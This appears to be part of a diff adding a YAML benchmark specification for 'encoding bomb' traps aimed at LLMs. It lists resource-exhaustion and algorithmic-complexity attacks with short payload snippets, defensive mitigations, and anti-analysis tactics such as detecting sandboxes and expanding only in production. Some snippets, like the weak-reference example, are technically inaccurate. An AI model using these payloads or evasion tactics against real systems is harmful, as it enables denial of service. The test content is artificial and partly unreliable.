+      expansion_ratio: "O(n) -> O(n^2)"
+      difficulty: 8
+      
+    - technique: "sort_adversarial"
+      description: "Input causes worst-case sorting"
+      llm_failure_mode: "LLM trusts sort as O(n log n)"
+      implementation: |
+        # Adversarial input for quicksort
+        data = [i for i in range(100000, 0, -1)]
+        sorted(data)  # May degrade on some implementations
+      expansion_ratio: "O(n log n) -> O(n^2)"
+      difficulty: 7
+      
+    - technique: "graph_path_explosion"
+      description: "Graph with exponential path count"
+      llm_failure_mode: "LLM counts nodes not paths"
+      implementation: |
+        # Binary DAG with 30 layers = 2^30 paths
+        def enumerate_paths(graph, start, end, path=[]):
+            if start == end:
+                yield path
+            for neighbor in graph[start]:
+                yield from enumerate_paths(graph, neighbor, end, path + [neighbor])
+      expansion_ratio: "O(2^n) paths"
+      difficulty: 8
+      
+    - technique: "dp_memory_explosion"
+      description: "DP with exponential state space"
+      llm_failure_mode: "LLM trusts DP as efficient"
+      implementation: |
+        # Traveling salesman with memoization
+        @lru_cache(maxsize=None)
+        def tsp(visited, current):
+            # visited is bitmask, 2^n states
+            if visited == (1 << n) - 1:
+                return dist[current][0]
+            # Exponential states for large n
+      expansion_ratio: "O(2^n * n)"
+      difficulty: 8
+
+  # Protocol Bombs (15+ techniques)
+  protocol_bombs:
+    - technique: "http2_header_bomb"
+      description: "HTTP/2 HPACK header table overflow"
+      llm_failure_mode: "LLM doesn't limit header table"
+      implementation: |
+        # Send headers that overflow dynamic table
+        for i in range(1000000):
+            headers.append((f'x-header-{i}', 'value'))
+      expansion_ratio: "header table exhaustion"
+      difficulty: 7
+      
+    - technique: "grpc_message_bomb"
+      description: "gRPC message exceeds limits"
+      llm_failure_mode: "LLM trusts protobuf messages"
+      implementation: |
+        # Repeated field with billions of elements
+        message.repeated_field.extend([0] * 10000000000)
+      expansion_ratio: "O(n) memory"
+      difficulty: 6
+      
+    - technique: "graphql_depth_bomb"
+      description: "GraphQL query with extreme depth"
+      llm_failure_mode: "LLM doesn't limit query depth"
+      implementation: |
+        query = '{ user { friends { friends { friends { ... }}}}'
+        # Each level multiplies database queries
+      expansion_ratio: "O(k^d) queries"
+      difficulty: 7
+
+  # Memory Bombs (10+ techniques)
+  memory_bombs:
+    - technique: "string_interning_bomb"
+      description: "Force string interning of many strings"
+      llm_failure_mode: "LLM doesn't track intern pool"
+      implementation: |
+        # Python interns short strings automatically
+        strings = [f'string_{i}' for i in range(10000000)]
+        # Intern pool grows without bound
+      expansion_ratio: "intern pool exhaustion"
+      difficulty: 7
+      
+    - technique: "weak_reference_bomb"
+      description: "Weak references prevent garbage collection"
+      llm_failure_mode: "LLM trusts weak refs don't hold memory"
+      implementation: |
+        import weakref
+        objects = []
+        refs = []
+        for i in range(1000000):
+            obj = LargeObject()
+            objects.append(obj)
+            refs.append(weakref.ref(obj))  # Objects not collected!
+      expansion_ratio: "O(n) memory"
+      difficulty: 6
+
+# === COMPREHENSIVE MITIGATION ===
+mitigation_strategies:
+  defense_layers:
+    - layer: "input_limits"
+      techniques:
+        - "Maximum file size"
+        - "Maximum decompression ratio"
+        - "Maximum nesting depth"
+        - "Maximum entity count"
+        - "Maximum recursion depth"
+        
+    - layer: "resource_limits"
+      techniques:
+        - "Memory limits (cgroups, ulimit)"
+        - "CPU time limits (signal.alarm)"
+        - "File descriptor limits"
+        - "Process limits"
+        
+    - layer: "safe_parsers"
+      techniques:
+        - "defusedxml for XML"
+        - "Streaming JSON parsers"
+        - "yaml.safe_load for YAML"
+        - "regex timeout libraries"
+        
+    - layer: "monitoring"
+      techniques:
+        - "Resource usage tracking"
+        - "Anomaly detection"
+        - "Automatic termination"
+
+# === ENHANCED DIFFICULTY CONFIGURATION ===
+enhanced_difficulty_config:
+  time_range: [7200, 18000]  # 120-300 minutes for expert reverse engineers
+  command_steps: [150, 500]  # Minimum 150 distinct analysis steps required
+  trap_count: "15+ nested, mutually-reinforcing traps"
+  
+  quality_requirements:
+    description: "120-300 minutes for expert reverse engineers and security researchers"
+    expertise_level: "Elite security researcher with mastery of compression internals, parser exploitation, and resource exhaustion attacks"
+    prerequisite_knowledge:
+      - "Compression algorithm internals (DEFLATE, LZ77, LZMA, Brotli) and decompression bombs"
+      - "XML entity expansion, DTD processing, and XXE vulnerabilities"
+      - "Regular expression automata theory and catastrophic backtracking"
+      - "Serialization format vulnerabilities (pickle, msgpack, protobuf, JSON)"
+      - "Memory allocator behavior and heap fragmentation attacks"
+      - "CPU cache timing and algorithmic complexity attacks"
+      - "Parser state machine vulnerabilities"
+      - "Polyglot file formats and format confusion attacks"
+  
+  phase_4_verification:
+    validation_criteria:
+      - "Contains 15+ interacting deceptive patterns that cascade across abstraction layers"
+      - "Has cascading resource exhaustion that spreads across processes"
+      - "Requires understanding of memory allocator and OS scheduler behavior"
+      - "Would take expert security researchers 120+ minutes"
+      - "Expansion ratios that appear legitimate but cause resource exhaustion"
+      - "Nested formats that compound expansion attacks across layers"
+      - "Polyglot bombs that exploit multiple parsers simultaneously"
+      - "Algorithmic complexity attacks disguised as valid data"
+      - "Self-replicating expansion patterns"
+  
+  difficulty_amplifiers:
+    nightmare:
+      multiplier: 4.0
+      description: "Deceptive complexity designed to defeat even expert analysis"
+      requirements:
+        - "7+ interacting traps that mask each other's symptoms"
+        - "Requires understanding of compiler optimizations and runtime behavior"
+        - "Time estimate: 120+ minutes for senior engineers"
+        - "Timing-dependent behavior that varies across environments"
+        - "Requires synthesizing debugging, systems, and language internals"
+    
+    nightmare_plus:
+      multiplier: 8.0
+      estimated_time: [43200, 259200]  # 12-72 hours
+      command_steps: [600, 3000]
+      techniques_required: 25
+      description: "CTF championship-level difficulty with adversarial anti-analysis mechanisms"
+      requirements:
+        - "15+ interacting bomb types with cascading expansion"
+        - "Polyglot payloads exploiting multiple format parsers"
+        - "Algorithmic complexity attacks with sub-linear detection difficulty"
+        - "Requires expertise in compression theory, parser design, and resource management"
+        - "Time estimate: 12-72 hours for elite security researchers"
+        - "Bombs that evade static analysis through format ambiguity"
+        - "Resource exhaustion patterns that adapt to available resources"
+        - "Nested encryption with expansion hidden in ciphertext"
+  
+  anti_patterns:
+    llm_failure_modes:
+      - "Trusting visible code structure over actual execution behavior"
+      - "Missing compiler optimization effects on code semantics"
+      - "Ignoring Unicode normalization and rendering differences"
+      - "Not considering filesystem race conditions with symlinks"
+      - "Missing singleton initialization order dependencies"
+      - "Overlooking environment variable and config file interactions"
+      - "Assuming deterministic behavior in timing-sensitive code"
+      - "Missing state corruption that only manifests under specific sequences"
+      - "Ignoring encoding round-trip issues that corrupt data silently"
+      - "Underestimating compression ratios in specialized formats"
+      - "Missing recursive expansion in nested formats"
+      - "Failing to calculate worst-case algorithmic complexity"
+  
+  generation_targets:
+    minimum_difficulty: "120-300 minutes, requires elite expertise in parser exploitation and resource exhaustion"
+    target_audience: "Expert reverse engineers, CTF champions, and elite security researchers"
+    success_criteria: "LLM fails to identify all encoding bombs in first 5 attempts"
+
+# === MULTI-AGENT ORCHESTRATION COMPLEXITY ===
+multi_agent_orchestration:
+  description: "Coordinating specialized bomb detection agents for comprehensive analysis"
+  
+  required_agents:
+    - agent: "compression_analyst"
+      role: "Analyze compression formats and expansion ratios"
+      capabilities:
+        - "Compression ratio calculation without full decompression"
+        - "Nested archive detection"
+        - "Quine and self-referential archive detection"
+      handoff_triggers:
+        - "Discovers suspicious compression ratios"
+        - "Finds nested compression layers"
+    
+    - agent: "parser_fuzzer"
+      role: "Fuzz parsers to find expansion vulnerabilities"
+      capabilities:
+        - "Grammar-based fuzzing of format parsers"
+        - "Entity expansion tracking in XML/YAML"
+        - "Regex complexity analysis"
+      handoff_triggers:
+        - "Discovers parser with high expansion potential"
+        - "Finds catastrophic backtracking patterns"
+    
+    - agent: "resource_monitor"
+      role: "Track resource consumption during parsing"
+      capabilities:
+        - "Memory allocation tracking"
+        - "CPU usage profiling"
+        - "Disk I/O monitoring"
+      handoff_triggers:
+        - "Detects exponential resource growth"
+        - "Finds memory fragmentation patterns"
+    
+    - agent: "format_specialist"
+      role: "Deep analysis of specific formats"
+      capabilities:
+        - "XML/DTD entity expansion analysis"
+        - "JSON depth and key analysis"
+        - "YAML alias expansion tracking"
+      handoff_triggers:
+        - "Format-specific vulnerability detected"
+        - "Cross-format polyglot discovered"
+    
+    - agent: "algorithmic_analyst"
+      role: "Analyze algorithmic complexity"
+      capabilities:
+        - "Regex NFA/DFA complexity calculation"
+        - "Hash collision detection"
+        - "Sorting algorithm worst-case analysis"
+      handoff_triggers:
+        - "Discovers super-linear complexity"
+        - "Finds hash collision attacks"
+    
+    - agent: "serialization_expert"
+      role: "Analyze serialization format attacks"
+      capabilities:
+        - "Deserialization gadget chain detection"
+        - "Object graph explosion analysis"
+        - "Type confusion vulnerability detection"
+      handoff_triggers:
+        - "Finds dangerous deserialization patterns"
+        - "Discovers gadget chains"
+    
+    - agent: "polyglot_detector"
+      role: "Detect polyglot file attacks"
+      capabilities:
+        - "Multi-format validity checking"
+        - "Format confusion exploitation analysis"
+        - "MIME type vs content mismatch detection"
+      handoff_triggers:
+        - "File valid as multiple formats"
+        - "Format-specific behaviors differ"
+    
+    - agent: "memory_analyst"
+      role: "Analyze memory-based attacks"
+      capabilities:
+        - "Heap fragmentation prediction"
+        - "Allocation pattern analysis"
+        - "GC pressure estimation"
+      handoff_triggers:
+        - "Discovers memory exhaustion patterns"
+        - "Finds allocator-specific attacks"
+  
+  cross_artifact_deception_chains:
+    - chain: "compression_to_parser_to_memory"
+      description: "Compressed bomb decompresses to parser bomb that exhausts memory"
+      stages:
+        - "Compressed archive appears small and safe"
+        - "Decompression yields valid but malicious format"
+        - "Parsing the format causes memory exhaustion"
+    
+    - chain: "polyglot_to_multiple_parsers"
+      description: "Single file attacks multiple parsers differently"
+      stages:
+        - "File validates as image"
+        - "Also valid as XML with entity expansion"
+        - "Also valid as archive with nested bombs"
+    
+    - chain: "regex_to_hash_to_sort"
+      description: "Cascading algorithmic complexity attacks"
+      stages:
+        - "Input causes regex backtracking during validation"
+        - "Partially processed data causes hash collisions"
+        - "Final sort becomes O(n²) on collision data"
+  
+  parallel_deception_analysis:
+    shared_symbolic_state:
+      - "Expansion ratio calculations across formats"
+      - "Resource consumption predictions"
+      - "Parser state across nested formats"
+      - "Complexity bounds across operations"
+    
+    synchronization_requirements:
+      - "Consistent expansion ratio tracking"
+      - "Coordinated resource limit enforcement"
+      - "Synchronized format validation"
+  
+  agent_handoff_protocols:
+    protocol: "cascading_bomb_detection"
+    steps:
+      - "Initial agent calculates surface-level expansion"
+      - "Handoff to format specialist for deeper analysis"
+      - "Specialist discovers nested expansion layer"
+      - "Recursive handoff for each nesting level"
+      - "Final synthesis of total expansion potential"
+
+# === META TRAP LAYERS ===
+meta_trap_layers:
+  first_order_traps:
+    description: "Obvious bombs detectable with basic checks"
+    examples:
+      - "Simple compression bomb with 1000:1 ratio"
+      - "Basic XML billion laughs pattern"
+      - "Deep JSON nesting"
+      - "Simple regex with nested quantifiers"
+    detection_time: "5-15 minutes"
+    llm_detection_rate: "70-90%"
+  
+  second_order_traps:
+    description: "Bombs hidden behind legitimate-looking wrappers"
+    examples:
+      - "Valid image with bomb in EXIF metadata"
+      - "Encrypted archive where decryption reveals bomb"
+      - "Compression bomb split across multiple entries"
+      - "Entity expansion hidden in parameter entities"
+    detection_time: "30-60 minutes"
+    llm_detection_rate: "30-50%"
+  
+  third_order_traps:
+    description: "Bombs that activate during analysis"
+    examples:
+      - "Archive that bombs when listing contents"
+      - "XML that bombs during schema validation"
+      - "JSON that bombs when detecting encoding"
+      - "Regex that bombs when testing match"
+    detection_time: "60-120 minutes"
+    llm_detection_rate: "10-20%"
+  
+  nth_order_traps:
+    description: "Recursive and adaptive bomb structures"
+    examples:
+      - "Bombs that generate other bombs during partial processing"
+      - "Adaptive compression that increases ratio under analysis"
+      - "Self-modifying formats that change based on parsing approach"
+      - "Infinite expansion through recursive format references"
+    detection_time: "120+ minutes per additional layer"
+    llm_detection_rate: "<5%"
+    
+  recursive_trap_structures:
+    - structure: "self_expanding_archive"
+      description: "Archive that contains larger versions of itself"
+      depth: "theoretically infinite"
+      
+    - structure: "mutually_recursive_entities"
+      description: "Entities that reference each other through chains"
+      depth: "depends on entity limit detection"
+      
+    - structure: "format_layered_expansion"
+      description: "Each format layer contains another format with more expansion"
+      depth: "limited by parser recursion limits"
+
+# === ANTI-ANALYSIS TECHNIQUES ===
+anti_analysis_techniques:
+  environment_detection:
+    - technique: "resource_limit_detection"
+      description: "Detect if running with resource limits"
+      methods:
+        - "Probe available memory before expansion"
+        - "Test decompression speed constraints"
+        - "Check file size limits"
+        - "Detect sandbox resource restrictions"
+      behavior_change: "Adjust expansion to evade detection while still being dangerous"
+    
+    - technique: "parser_version_detection"
+      description: "Detect parser implementation and version"
+      methods:
+        - "Use format quirks to identify parser"
+        - "Test parser-specific behaviors"
+        - "Detect patch levels through behavior"
+      behavior_change: "Target vulnerable parser versions, appear safe on patched versions"
+    
+    - technique: "analysis_tool_detection"
+      description: "Detect security analysis tools"
+      methods:
+        - "Detect known safe expansion checkers"
+        - "Identify format validators"
+        - "Detect compression analysis tools"
+      behavior_change: "Reduce expansion to pass validation, full expansion in production"
+  
+  anti_debugging_measures:
+    - measure: "expansion_timing"
+      description: "Vary expansion based on processing speed"
+      implementation: "Slow processing suggests analysis, reduce visible expansion"
+      
+    - measure: "incremental_expansion"
+      description: "Expand gradually to evade threshold detection"
+      implementation: "Each parsing pass expands slightly more"
+      
+    - measure: "resource_adaptive"
+      description: "Adapt to available resources"
+      implementation: "Expand up to but not over detected limits"
+  
+  anti_tracing_mechanisms:
+    - mechanism: "format_obfuscation"
+      description: "Obfuscate bomb pattern in format structure"
+      implementation: "Use format-specific features to hide expansion patterns"
+      
+    - mechanism: "distributed_expansion"
+      description: "Spread expansion across multiple format features"
+      implementation: "No single feature triggers expansion threshold"
+      
+    - mechanism: "conditional_expansion"
+      description: "Expansion only occurs under specific conditions"
+      implementation: "Bomb activates only with specific parser options"
+  
+  time_based_anti_analysis:
+    - technique: "delayed_expansion"
+      description: "Expansion increases over multiple parsing passes"
+      implementation: "First parse appears safe, subsequent parses expand more"
+      
+    - technique: "time_aware_compression"
+      description: "Compression ratio varies based on processing time"
+      implementation: "Fast processing gets higher expansion"
+      
+    - technique: "stateful_expansion"
+      description: "Expansion depends on previous parsing history"
+      implementation: "Track parsing attempts, increase danger over time"
+
+# === PSYCHOLOGICAL MISDIRECTION ===
+psychological_misdirection:
+  obvious_false_positives:
+    description: "Intentional red herrings to waste analyst time"
+    examples:
+      - name: "obvious_nested_compression"
+        description: "Clearly nested archives that expand to small, safe content"
+        time_waste: "30-60 minutes"
+        
+      - name: "suspicious_entity_definitions"
+        description: "Many entity definitions that don't actually expand much"
+        time_waste: "20-40 minutes"
+        
+      - name: "deep_but_narrow_nesting"
+        description: "Very deep nesting with minimal data at each level"
+        time_waste: "45-90 minutes"
+  
+  misleading_comments:
+    description: "Format metadata that misdirects analysis"
+    examples:
+      - "<!-- This file has been validated safe by security team -->"
+      - "# Compression ratio verified: 10:1 (safe)"
+      - "// Entity count: 5 (within limits)"
+      - "/* Archive tested with standard expansion checks */"
+  
+  misleading_variable_names:
+    description: "Format field names that hide true purpose"
+    examples:
+      - "safe_entity - actually references dangerous expansion"
+      - "validated_content - contains unvalidated nested format"
+      - "compressed_thumbnail - full resolution bomb"
+      - "metadata_only - contains embedded executable"
+  
+  red_herring_code_paths:
+    description: "Format structures that appear critical but are safe"
+    examples:
+      - name: "elaborate_entity_hierarchy"
+        description: "Complex entity structure with minimal expansion"
+        
+      - name: "suspicious_compression_header"
+        description: "Headers suggesting high compression that's actually low"
+        
+      - name: "nested_format_markers"
+        description: "Format markers suggesting nesting that doesn't exist"
+  
+  partial_solutions:
+    description: "Defenses that work initially but enable harder attacks"
+    examples:
+      - name: "entity_limit_bypass"
+        description: "Setting entity limit enables parameter entity attack"
+        
+      - name: "decompression_limit"
+        description: "Size limit can be bypassed with incremental decompression"
+        
+      - name: "depth_limit"
+        description: "Depth limit enables wide expansion attack instead"
+
+# === VERSION HISTORY ===
+version_history:
+  - version: "1.0.0"
+    date: "2024-01-01"
+    changes: "Initial encoding bomb traps"
+  - version: "2.0.0"
+    date: "2024-06-01"
+    changes: "Expanded to 1000+ lines with comprehensive bomb types"
+  - version: "3.0.0"
+    date: "2024-12-01"
+    changes: "Enhanced difficulty with nightmare mode and comprehensive anti-patterns"
